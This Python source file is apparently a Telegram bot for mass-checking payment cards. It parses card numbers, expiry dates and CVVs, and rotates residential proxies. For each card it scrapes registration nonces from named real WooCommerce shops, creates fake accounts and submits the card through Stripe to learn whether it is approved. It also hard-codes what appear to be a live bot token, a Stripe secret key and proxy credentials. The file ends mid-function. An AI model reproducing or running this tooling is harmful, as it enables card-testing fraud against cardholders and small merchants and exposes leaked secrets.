import asyncio
import logging
import time
from datetime import datetime
import random
import re
import uuid
import csv
from bs4 import BeautifulSoup
import httpx
import os
from typing import Optional, Dict, List
from collections import defaultdict

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.fsm.storage.memory import MemoryStorage

# ==================== BIN DATABASE ====================
class BinDatabase:
    """Database for BIN information lookup"""
    
    def __init__(self, csv_file_path="bins.csv"):
        self.bins = {}
        self.csv_file_path = csv_file_path
        self.load_bins()
    
    def load_bins(self):
        """Load BIN data from CSV file"""
        try:
            with open(self.csv_file_path, 'r', encoding='utf-8') as file:
                reader = csv.DictReader(file)
                for row in reader:
                    bin_number = row['number'].strip('"')
                    self.bins[bin_number] = {
                        'country': row['country'].strip('"'),
                        'flag': row['flag'].strip('"'),
                        'vendor': row['vendor'].strip('"'),
                        'type': row['type'].strip('"'),
                        'level': row['level'].strip('"'),
                        'bank': row['bank'].strip('"')
                    }
            logger.info(f"📊 Loaded {len(self.bins)} BINs from database")
        except FileNotFoundError:
            logger.warning(f"⚠️ BIN database file {self.csv_file_path} not found")
        except Exception as e:
            logger.error(f"❌ Error loading BIN database: {e}")
    
    def get_bin_info(self, card_number: str) -> Optional[Dict]:
        """Get BIN information for a card number"""
        if len(card_number) < 6:
            return None
        
        bin_number = card_number[:6]
        
        # Try exact match first
        if bin_number in self.bins:
            return self.bins[bin_number]
        
        # Try with leading zeros for shorter BINs
        for length in range(5, 0, -1):
            if len(bin_number) > length:
                padded_bin = bin_number[:length].zfill(6)
                if padded_bin in self.bins:
                    return self.bins[padded_bin]
        
        return None
    
    def format_bin_info(self, bin_info: Dict) -> str:
        """Format BIN information for display"""
        if not bin_info:
            return "╟ 𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲: Unknown\n╟ 𝗕𝗮𝗻𝗸: Unknown\n╟ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: Unknown"
        
        card_type = f"{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}".strip(" -")
        bank = bin_info['bank'] if bin_info['bank'] else "Unknown Bank"
        country = f"{bin_info['country']} {bin_info['flag']}" if bin_info['flag'] else bin_info['country']
        
        return f"╟ 𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲: {card_type}\n╟ 𝗕𝗮𝗻𝗸: {bank}\n╟ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}"

# Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "7730148236:AAHBzpUIKbjTOJuR19hJPcMU427-Oojy9BU")
STRIPE_API_KEY = os.getenv("STRIPE_API_KEY", "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")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "8014397974")

# Proxy list - add multiple proxies here
PROXY_LIST = [
    "http://geonode_8jyRQvRui6-type-residential:305649b7-1a2d-4c8f-8a3a-6505059428ba@proxy.geonode.io:9000",
    "http://mQHCs1JCVFo0g118:FjN7hOaJ4e0EmTKP@geo.g-w.info:10080",
    "http://ee3ZXBEcNKrhQFTq:EaQb4ORQxul3Pigv@geo.g-w.info:10080",
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888",
    "http://luW3DN11mn4wZra4:jkYhLr2eKLSlMfTJ@geo.g-w.info:100080",
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888",
    "http://KkdYDdCJEg6molnU:mOC4IC6SA1K7kwQx@geo.g-w.info:10080",
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888"
    # Add more proxies:
    # "http://user:pass@proxy2.com:8080",
    # "http://user:pass@proxy3.com:8080",
]

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Rate limiting
last_chk_time: Dict[int, datetime] = {}
last_mass_time: Dict[int, datetime] = {}

# Bot and Dispatcher
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== OPTIMIZED PROXY MANAGER ====================
class ProxyManager:
    """Manage multiple proxies with rotation and statistics"""
    
    def __init__(self, proxy_list: List[str]):
        self.proxies = [p for p in proxy_list if p]
        self.current_index = 0
        self.working_proxies = []
        self.proxy_stats = defaultdict(lambda: {"success": 0, "fail": 0, "avg_time": 0})
        self.lock = asyncio.Lock()
        logger.info(f"📡 Loaded {len(self.proxies)} proxies")
    
    async def test_proxy(self, proxy: str) -> bool:
        """Test if proxy is working"""
        try:
            async with httpx.AsyncClient(proxy=proxy, timeout=20) as client:
                # Use a simple endpoint that doesn't block proxies
                response = await client.get("https://www.google.com", follow_redirects=True)
                return response.status_code == 200
        except Exception as e:
            logger.debug(f"Proxy test failed for {proxy[:30]}: {e}")
            return False
    
    async def quick_test_proxy(self, proxy: str) -> bool:
        """Fast proxy test (2 seconds)"""
        try:
            async with httpx.AsyncClient(proxy=proxy, timeout=2) as client:
                await client.get("https://httpbin.org/ip")
                return True
        except:
            return False
    
    async def get_working_proxy(self) -> Optional[str]:
        """Get proxy with automatic failover"""
        for proxy in self.working_proxies:
            if await self.quick_test_proxy(proxy):
                return proxy
        
        # If no proxy works, try to refresh
        logger.warning("No working proxies found, refreshing...")
        await self.refresh_proxies()
        return random.choice(self.working_proxies) if self.working_proxies else None
    
    async def refresh_proxies(self):
        """Refresh proxy list and test again"""
        logger.info("🔄 Refreshing proxy list...")
        self.working_proxies.clear()
        
        # Test all proxies again
        tasks = [self.test_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks)
        
        for proxy, is_working in zip(self.proxies, results):
            if is_working:
                self.working_proxies.append(proxy)
                logger.info(f"✅ Working proxy: {proxy[:30]}...")
        
        if not self.working_proxies:
            logger.warning("⚠️ No working proxies after refresh")
        else:
            logger.info(f"✅ {len(self.working_proxies)} working proxies after refresh")
    
    async def initialize(self):
        """Test all proxies in parallel and filter working ones"""
        logger.info("🔄 Testing proxies in parallel...")
        
        # Test all proxies concurrently
        tasks = [self.test_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks)
        
        for proxy, is_working in zip(self.proxies, results):
            if is_working:
                self.working_proxies.append(proxy)
                logger.info(f"✅ Working proxy: {proxy[:30]}...")
            else:
                logger.warning(f"❌ Dead proxy: {proxy[:30]}...")
        
        if not self.working_proxies:
            logger.warning("⚠️ No working proxies, will proceed without proxy")
        else:
            logger.info(f"✅ {len(self.working_proxies)} working proxies ready")
    
    def get_best_proxy(self) -> Optional[str]:
        """Get proxy with best success rate"""
        if not self.working_proxies:
            return None
        
        # If no stats yet, return random
        if not self.proxy_stats:
            return random.choice(self.working_proxies)
        
        # Find proxy with best success rate
        best_proxy = None
        best_score = -1
        
        for proxy in self.working_proxies:
            stats = self.proxy_stats[proxy]
            total = stats["success"] + stats["fail"]
            if total == 0:
                score = 0.5  # Neutral score for untested
            else:
                score = stats["success"] / total
            
            if score > best_score:
                best_score = score
                best_proxy = proxy
        
        return best_proxy or random.choice(self.working_proxies)
    
    def get_random_proxy(self) -> Optional[str]:
        """Get random working proxy"""
        if not self.working_proxies:
            return None
        return random.choice(self.working_proxies)
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.working_proxies:
            return None
        proxy = self.working_proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.working_proxies)
        return proxy
    
    async def record_result(self, proxy: Optional[str], success: bool, response_time: float):
        """Record proxy performance"""
        if not proxy:
            return
        
        async with self.lock:
            stats = self.proxy_stats[proxy]
            if success:
                stats["success"] += 1
            else:
                stats["fail"] += 1
            
            # Update average response time
            total = stats["success"] + stats["fail"]
            stats["avg_time"] = ((stats["avg_time"] * (total - 1)) + response_time) / total

# Initialize proxy manager
proxy_manager = ProxyManager(PROXY_LIST)

# ==================== ADVANCED HTTP CLIENT POOL ====================
class AdvancedClientPool:
    """Advanced HTTP client pool with connection pooling and optimization"""
    
    def __init__(self, max_clients_per_proxy=10, max_total_clients=100):
        self.clients = {}
        self.client_queues = {}
        self.active_connections = {}
        self.max_clients_per_proxy = max_clients_per_proxy
        self.max_total_clients = max_total_clients
        self.lock = asyncio.Lock()
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "connection_reuses": 0,
            "new_connections": 0
        }
        
        # Advanced HTTP settings for maximum performance
        self.default_limits = httpx.Limits(
            max_keepalive_connections=20,
            max_connections=100,
            keepalive_expiry=30.0
        )
        
        logger.info(f"🚀 Advanced Client Pool initialized: {max_clients_per_proxy} clients/proxy, {max_total_clients} total")
    
    async def get_client(self, proxy=None, timeout=15, max_retries=3):
        """Get optimized HTTP client with advanced connection pooling"""
        proxy_key = proxy or "no_proxy"
        
        async with self.lock:
            # Initialize queue for this proxy if not exists
            if proxy_key not in self.client_queues:
                self.client_queues[proxy_key] = asyncio.Queue(maxsize=self.max_clients_per_proxy)
                self.active_connections[proxy_key] = 0
            
            # Try to get existing client from queue
            try:
                client = self.client_queues[proxy_key].get_nowait()
                self.stats["connection_reuses"] += 1
                return client
            except asyncio.QueueEmpty:
                pass
            
            # Create new client if under limit
            if self.active_connections[proxy_key] < self.max_clients_per_proxy:
                client = httpx.AsyncClient(
                    proxy=proxy,
                    timeout=timeout,
                    follow_redirects=True,
                    # Advanced settings for maximum performance
                    http2=True,  # Enable HTTP/2 for better performance
                    verify=False,  # Skip SSL verification for speed (use with caution)
                    # Connection pooling settings
                    limits=httpx.Limits(
                        max_keepalive_connections=20,
                        max_connections=50,
                        keepalive_expiry=60.0
                    )
                )
                
                self.active_connections[proxy_key] += 1
                self.stats["new_connections"] += 1
                
                # Store client info for cleanup
                client._proxy_key = proxy_key
                client._created_at = time.time()
                
                logger.debug(f"🆕 Created new client for {proxy_key[:20]}... (Total: {self.active_connections[proxy_key]})")
                return client
            
            # Wait for available client if at limit
            logger.warning(f"⚠️ Client pool full for {proxy_key[:20]}..., waiting...")
            client = await self.client_queues[proxy_key].get()
            self.stats["connection_reuses"] += 1
            return client
    
    async def return_client(self, client):
        """Return client to pool for reuse"""
        if not hasattr(client, '_proxy_key'):
            await client.aclose()
            return
            
        proxy_key = client._proxy_key
        
        async with self.lock:
            try:
                # Check if client is still healthy
                if await self._is_client_healthy(client):
                    self.client_queues[proxy_key].put_nowait(client)
                    logger.debug(f"♻️ Returned client to pool for {proxy_key[:20]}...")
                else:
                    # Close unhealthy client
                    await client.aclose()
                    self.active_connections[proxy_key] -= 1
                    logger.debug(f"🗑️ Closed unhealthy client for {proxy_key[:20]}...")
            except asyncio.QueueFull:
                # Pool is full, close the client
                await client.aclose()
                self.active_connections[proxy_key] -= 1
                logger.debug(f"🗑️ Pool full, closed client for {proxy_key[:20]}...")
    
    async def _is_client_healthy(self, client):
        """Check if client is still healthy"""
        try:
            # Quick health check
            response = await client.get("https://httpbin.org/ip", timeout=2)
            return response.status_code == 200
        except:
            return False
    
    async def close_all(self):
        """Close all clients and cleanup"""
        async with self.lock:
            total_closed = 0
            for proxy_key, queue in self.client_queues.items():
                while not queue.empty():
                    try:
                        client = queue.get_nowait()
                        await client.aclose()
                        total_closed += 1
                    except asyncio.QueueEmpty:
                        break
                self.active_connections[proxy_key] = 0
            
            self.clients.clear()
            self.client_queues.clear()
            logger.info(f"🔌 Closed {total_closed} HTTP clients")
    
    def get_stats(self):
        """Get pool statistics"""
        total_active = sum(self.active_connections.values())
        return {
            **self.stats,
            "active_connections": total_active,
            "connections_per_proxy": dict(self.active_connections)
        }

# Initialize advanced client pool
client_pool = AdvancedClientPool(max_clients_per_proxy=15, max_total_clients=200)

# ==================== ADVANCED PARALLEL PROCESSING ====================
class ParallelProcessor:
    """Advanced parallel processing system for maximum performance"""
    
    def __init__(self, max_concurrent_tasks=50, batch_size=10):
        self.max_concurrent_tasks = max_concurrent_tasks
        self.batch_size = batch_size
        self.semaphore = asyncio.Semaphore(max_concurrent_tasks)
        self.active_tasks = 0
        self.completed_tasks = 0
        self.failed_tasks = 0
        self.lock = asyncio.Lock()
        
        logger.info(f"⚡ Parallel Processor initialized: {max_concurrent_tasks} concurrent tasks, batch size {batch_size}")
    
    async def process_batch(self, tasks, progress_callback=None):
        """Process a batch of tasks with advanced parallelization"""
        if not tasks:
            return []
        
        logger.info(f"🚀 Processing batch of {len(tasks)} tasks...")
        
        # Create semaphore-controlled tasks
        semaphore_tasks = []
        for i, task in enumerate(tasks):
            semaphore_task = self._process_with_semaphore(task, i, progress_callback)
            semaphore_tasks.append(semaphore_task)
        
        # Process all tasks concurrently
        results = await asyncio.gather(*semaphore_tasks, return_exceptions=True)
        
        # Handle results and exceptions
        processed_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                logger.error(f"Task {i} failed: {result}")
                self.failed_tasks += 1
                processed_results.append(f"Error: {str(result)}")
            else:
                processed_results.append(result)
                self.completed_tasks += 1
        
        logger.info(f"✅ Batch completed: {self.completed_tasks} success, {self.failed_tasks} failed")
        return processed_results
    
    async def _process_with_semaphore(self, task, task_id, progress_callback=None):
        """Process single task with semaphore control"""
        async with self.semaphore:
            async with self.lock:
                self.active_tasks += 1
            
            try:
                # Execute the actual task
                if asyncio.iscoroutine(task):
                    result = await task
                elif asyncio.iscoroutinefunction(task):
                    result = await task()
                else:
                    result = task
                
                # Update progress if callback provided
                if progress_callback:
                    await progress_callback(task_id, self.active_tasks, self.completed_tasks + self.failed_tasks)
                
                return result
            finally:
                async with self.lock:
                    self.active_tasks -= 1
    
    def get_stats(self):
        """Get processing statistics"""
        return {
            "active_tasks": self.active_tasks,
            "completed_tasks": self.completed_tasks,
            "failed_tasks": self.failed_tasks,
            "total_tasks": self.completed_tasks + self.failed_tasks,
            "success_rate": (self.completed_tasks / max(self.completed_tasks + self.failed_tasks, 1)) * 100
        }

# Initialize parallel processor
parallel_processor = ParallelProcessor(max_concurrent_tasks=100, batch_size=20)

# ==================== ADVANCED CARD PROCESSING ====================
class CardProcessor:
    """Advanced card processing with intelligent batching and optimization"""
    
    def __init__(self):
        self.processing_stats = {
            "total_cards": 0,
            "successful_cards": 0,
            "failed_cards": 0,
            "processing_time": 0,
            "cards_per_second": 0
        }
        self.lock = asyncio.Lock()
    
    async def process_cards_parallel(self, cards, gateway_func, max_concurrent=50):
        """Process multiple cards with maximum parallelization"""
        if not cards:
            return []
        
        start_time = time.time()
        logger.info(f"🎯 Processing {len(cards)} cards with {max_concurrent} concurrent tasks...")
        
        # Create tasks for parallel processing
        tasks = []
        for card in cards:
            task = self._create_card_task(card, gateway_func)
            tasks.append(task)
        
        # Process with advanced parallel processor
        results = await parallel_processor.process_batch(tasks)
        
        # Update statistics
        processing_time = time.time() - start_time
        async with self.lock:
            self.processing_stats.update({
                "total_cards": len(cards),
                "successful_cards": sum(1 for r in results if "APPROVED" in str(r) or "DECLINED" in str(r)),
                "failed_cards": sum(1 for r in results if "ERROR" in str(r)),
                "processing_time": processing_time,
                "cards_per_second": len(cards) / processing_time if processing_time > 0 else 0
            })
        
        logger.info(f"⚡ Processed {len(cards)} cards in {processing_time:.2f}s ({len(cards)/processing_time:.1f} cards/sec)")
        return results
    
    async def _create_card_task(self, card, gateway_func):
        """Create optimized task for card processing"""
        async def task():
            client = None
            try:
                # Get client from advanced pool
                proxy = await proxy_manager.get_working_proxy()
                client = await client_pool.get_client(proxy=proxy, timeout=30)
                
                # Execute gateway function
                result = await gateway_func(card)
                return result
            except Exception as e:
                logger.error(f"Card processing error for {card[:20]}...: {e}")
                return format_card_result("error", card, f"Processing error: {str(e)}", "Gateway: Advanced")
            finally:
                # Return client to pool if it exists
                if client:
                    await client_pool.return_client(client)
        
        return task
    
    def get_stats(self):
        """Get processing statistics"""
        return self.processing_stats.copy()

# Initialize card processor
card_processor = CardProcessor()

# Initialize BIN database
bin_db = BinDatabase()

# ==================== UTILITIES ====================
def generate_fake_email() -> str:
    """Generate random email"""
    random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com']
    return f"{random_string}@{random.choice(domains)}"

def parse_card_details(card_string: str) -> tuple:
    """Parse card details from string"""
    card_string = card_string.strip()
    cc, mm, yy, cvv = None, None, None, None

    match = re.search(r'(\d{13,19})[|/\s-]+(\d{1,2})[|/\s-]+(\d{2}|\d{4})[|/\s-]+(\d{3,4})', card_string)
    if match:
        cc, mm, yy, cvv = match.groups()
    else:
        temp = card_string
        cc_match = re.search(r'\d{13,19}', temp)
        if cc_match: 
            cc = cc_match.group(0)
            temp = temp.replace(cc, '', 1)
        mm_match = re.search(r'(?:MM:|M:)?\s*(\d{1,2})(?!\d)', temp)
        if mm_match: 
            mm = mm_match.group(1)
            temp = temp.replace(mm_match.group(0), '', 1)
        yy_match = re.search(r'(?:YY:|Y:)?\s*(\d{2}|\d{4})(?!\d)', temp)
        if yy_match: 
            yy = yy_match.group(1)
            temp = temp.replace(yy_match.group(0), '', 1)
        cvv_match = re.search(r'(?:CVV:|CVC:)?\s*(\d{3,4})(?!\d)', temp)
        if cvv_match: 
            cvv = cvv_match.group(1)

    if not all([cc, mm, yy, cvv]):
        return None, None, None, None

    try:
        mm_int = int(mm)
        if not (1 <= mm_int <= 12):
            return None, None, None, None
        current_year = datetime.now().year
        if len(yy) == 2:
            yy_full = int(f"20{yy}") if int(yy) >= (current_year % 100) else int(f"19{yy}")
        else:
            yy_full = int(yy)
        if not (current_year <= yy_full <= current_year + 15):
            return None, None, None, None
    except:
        return None, None, None, None

    return cc, str(mm_int).zfill(2), str(yy_full)[-2:], cvv

def format_card_result(status: str, card: str, message: str, extra_info: str = None) -> str:
    """Format card check result with BIN information"""
    if status == "approved":
        emoji, status_text = "✅", "APPROVED"
    elif status == "declined":
        emoji, status_text = "❌", "DECLINED"
    elif status == "error":
        emoji, status_text = "⚠️", "ERROR"
    else:
        emoji, status_text = "ℹ️", "INFO"
    
    # Get BIN information
    cc = card.split("|")[0]
    bin_info = bin_db.get_bin_info(cc)
    bin_display = bin_db.format_bin_info(bin_info)
    
    # Escape HTML special characters in message and extra_info
    message_escaped = message.replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')
    extra_info_escaped = extra_info.replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;') if extra_info else None
    
    result = f"{emoji} <b>{status_text}</b>\n━━━━━━━━━━━━━━━\n<code>{card}</code>\n━━━━━━━━━━━━━━━\n{bin_display}\n━━━━━━━━━━━━━━━\n<b>Response:</b> {message_escaped}\n"
    if extra_info_escaped:
        result += f"<b>Info:</b> {extra_info_escaped}\n"
    result += "━━━━━━━━━━━━━━━"
    return result

def clean_error_message(error_str: str) -> str:
    """Clean error messages"""
    error_str = str(error_str)
    if "for url:" in error_str.lower():
        error_str = error_str.split("for url:")[0].strip()
    if "https://" in error_str or "http://" in error_str:
        error_str = "Service temporarily unavailable"
    return error_str[:200]

async def show_progress(message, current, total, gateway):
    """Show progress bar for mass checks"""
    progress_bar = "█" * int((current/total) * 10)
    empty_bar = "░" * (10 - len(progress_bar))
    percentage = int((current/total) * 100)
    
    progress_text = f"""
🔄 <b>{gateway} Processing</b>
{progress_bar}{empty_bar} {percentage}%
<b>{current}/{total}</b> cards processed
    """
    
    try:
        await message.edit_text(progress_text, parse_mode='HTML')
    except:
        pass  # Ignore edit errors

# ==================== STRIPE AUTH CHECKER ====================
async def stripe_auth_check_card(card: str) -> str:
    """Check card via Stripe Auth gateway"""
    cc, mm, yy, cvv = card.split("|")
    start_time = time.time()
    
    proxy = await proxy_manager.get_working_proxy()
    if not proxy:
        return format_card_result("error", card, "No working proxy available", "Gateway: Error")
    
    client = None
    
    try:
        client = await client_pool.get_client(proxy=proxy, timeout=30)
        mail = generate_fake_email()
        
        headers = {
            'authority': 'bahamabos.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        }
        
        # Step 1: Get registration page
        try:
            response = await client.get('https://bahamabos.com/my-account/', headers=headers)
            if response.status_code != 200:
                raise Exception(f"Failed to load page: {response.status_code}")
        except Exception as e:
            raise Exception(f"Network error loading page: {str(e)}")
        
        soup = BeautifulSoup(response.text, 'lxml')
        nonce = soup.find(id="woocommerce-register-nonce")
        if not nonce:
            raise Exception("Registration nonce not found")
        nonce_value = nonce.get("value")
        
        # Step 2: Register account
        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bahamabos.com',
            'referer': 'https://bahamabos.com/my-account/',
            'sec-fetch-site': 'same-origin'
        })
        
        register_data = {
            'email': mail,
            'woocommerce-register-nonce': nonce_value,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        try:
            response = await client.post('https://bahamabos.com/my-account/', headers=headers, data=register_data)
            if response.status_code not in [200, 302]:
                raise Exception(f"Registration failed: {response.status_code}")
        except Exception as e:
            raise Exception(f"Registration error: {str(e)}")
        
        # Step 3: Get add payment method page
        headers.pop('content-type', None)
        headers['referer'] = 'https://bahamabos.com/my-account/'
        
        try:
            response = await client.get('https://bahamabos.com/my-account/add-payment-method/', headers=headers)
            if response.status_code != 200:
                raise Exception(f"Failed to load payment page: {response.status_code}")
        except Exception as e:
            raise Exception(f"Payment page error: {str(e)}")
        
        soup = BeautifulSoup(response.text, 'lxml')
        
        # Extract AJAX nonce
        ajax_nonce = None
        for script in soup.find_all('script'):
            if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', script.string)
                if match:
                    ajax_nonce = match.group(1)
                    break
        
        if not ajax_nonce:
            raise Exception("Ajax nonce not found")
        
        # Step 4: Create Stripe payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': headers['user-agent'],
            'authorization': 'Bearer pk_live_axb2b6B9U2aIqQq93VRd6qF6009oO6P3ds',
        }
        
        stripe_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "billing_details[address][country]": "IN",
        }
        
        try:
            response = await client.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
        except Exception as e:
            raise Exception(f"Stripe API error: {str(e)}")
        
        if response.status_code != 200:
            try:
                pm_json = response.json()
                error_msg = pm_json.get("error", {}).get("message", "Card declined")
                decline_code = pm_json.get("error", {}).get("decline_code", "")
                if decline_code:
                    error_msg += f" ({decline_code})"
            except:
                error_msg = "Card declined"
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")
        
        try:
            pm_json = response.json()
            pm_id = pm_json.get("id")
        except:
            raise Exception("Invalid payment method response")
        
        if not pm_id:
            raise Exception("Payment method ID not found")
        
        # Step 5: Confirm setup intent
        final_headers = headers.copy()
        final_headers.update({
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'referer': 'https://bahamabos.com/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
        })
        
        final_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        try:
            response = await client.post('https://bahamabos.com/wp-admin/admin-ajax.php', headers=final_headers, data=final_data)
        except Exception as e:
            raise Exception(f"Ajax request error: {str(e)}")
        
        if response.status_code == 403:
            raise Exception("Service temporarily unavailable (403)")
        
        if response.status_code != 200:
            raise Exception(f"Service temporarily unavailable ({response.status_code})")
        
        try:
            result_json = response.json()
        except:
            raise Exception("Invalid response format")
        
        time_taken = time.time() - start_time
        
        if result_json.get("success"):
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("approved", card, "Card Approved Successfully! ✅", f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")
        else:
            error_data = result_json.get("data", {})
            error = error_data.get("error", {})
            error_msg = error.get("message", "Payment declined")
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")
    
    except Exception as e:
        time_taken = time.time() - start_time
        await proxy_manager.record_result(proxy, False, time_taken)
        logger.error(f"Stripe Auth check failed: {e}")
        error_msg = clean_error_message(str(e))
        return format_card_result("error", card, error_msg, f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")
    finally:
        # Return client to pool if it exists
        if client:
            await client_pool.return_client(client)

# ==================== STRIPE AUTH CHECKER #2 ====================
async def stripe_auth_check_card_v2(card: str) -> str:
    """Check card via Stripe Auth V2 gateway"""
    cc, mm, yy, cvv = card.split("|")
    start_time = time.time()
    
    proxy = await proxy_manager.get_working_proxy()
    if not proxy:
        return format_card_result("error", card, "No working proxy available", "Gateway: Error")
    
    client = None
    
    try:
        client = await client_pool.get_client(proxy=proxy, timeout=30)
        mail = generate_fake_email()
        
        headers = {
            'authority': 'steepvillagehall.org.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        }
        
        # Step 1: Get registration page
        try:
            response = await client.get('https://steepvillagehall.org.uk/my-account/', headers=headers)
            if response.status_code != 200:
                raise Exception(f"Failed to load page: {response.status_code}")
        except Exception as e:
            raise Exception(f"Network error loading page: {str(e)}")
        
        soup = BeautifulSoup(response.text, 'lxml')
        
        # Try different nonce selectors
        nonce = soup.find(id="woocommerce-register-nonce")
        if not nonce:
            nonce = soup.find('input', {'name': 'woocommerce-register-nonce'})
        if not nonce:
            nonce = soup.find('input', {'name': '_wpnonce'})
        if not nonce:
            # Try to find any nonce input
            nonce_inputs = soup.find_all('input', {'name': lambda x: x and 'nonce' in x.lower()})
            if nonce_inputs:
                nonce = nonce_inputs[0]
        
        if not nonce:
            raise Exception("Registration nonce not found - site may not support WooCommerce")
        nonce_value = nonce.get("value")
        
        # Step 2: Register account
        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://steepvillagehall.org.uk',
            'referer': 'https://steepvillagehall.org.uk/my-account/',
            'sec-fetch-site': 'same-origin'
        })
        
        register_data = {
            'email': mail,
            'woocommerce-register-nonce': nonce_value,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        try:
            response = await client.post('https://steepvillagehall.org.uk/my-account/', headers=headers, data=register_data)
            if response.status_code not in [200, 302]:
                raise Exception(f"Registration failed: {response.status_code}")
        except Exception as e:
            raise Exception(f"Registration error: {str(e)}")
        
        # Step 3: Get add payment method page
        headers.pop('content-type', None)
        headers['referer'] = 'https://steepvillagehall.org.uk/my-account/'
        
        try:
            response = await client.get('https://steepvillagehall.org.uk/my-account/add-payment-method/', headers=headers)
            if response.status_code != 200:
                raise Exception(f"Failed to load payment page: {response.status_code}")
        except Exception as e:
            raise Exception(f"Payment page error: {str(e)}")
        
        soup = BeautifulSoup(response.text, 'lxml')
        
        # Extract AJAX nonce - try multiple patterns
        ajax_nonce = None
        
        # Try different nonce patterns
        nonce_patterns = [
            r'"createAndConfirmSetupIntentNonce":"(.*?)"',
            r'"wc_stripe_create_and_confirm_setup_intent":"(.*?)"',
            r'"ajax_nonce":"(.*?)"',
            r'"nonce":"(.*?)"',
            r'var ajax_nonce = ["\'](.*?)["\']',
            r'var nonce = ["\'](.*?)["\']'
        ]
        
        for script in soup.find_all('script'):
            if script.string:
                for pattern in nonce_patterns:
                    match = re.search(pattern, script.string)
                    if match:
                        ajax_nonce = match.group(1)
                        break
                if ajax_nonce:
                    break
        
        # If still not found, try to find in meta tags
        if not ajax_nonce:
            meta_nonce = soup.find('meta', {'name': 'wp-nonce'})
            if meta_nonce:
                ajax_nonce = meta_nonce.get('content')
        
        if not ajax_nonce:
            # Log page content for debugging
            logger.warning(f"Site page content (first 500 chars): {response.text[:500]}")
            raise Exception("Ajax nonce not found - site may not support Stripe integration")
        
        # Step 4: Create Stripe payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': headers['user-agent'],
            'authorization': 'Bearer pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n',
        }
        
        stripe_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "billing_details[address][country]": "GB",  # UK country code
        }
        
        try:
            response = await client.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
        except Exception as e:
            raise Exception(f"Stripe API error: {str(e)}")
        
        if response.status_code != 200:
            try:
                pm_json = response.json()
                error_msg = pm_json.get("error", {}).get("message", "Card declined")
                decline_code = pm_json.get("error", {}).get("decline_code", "")
                if decline_code:
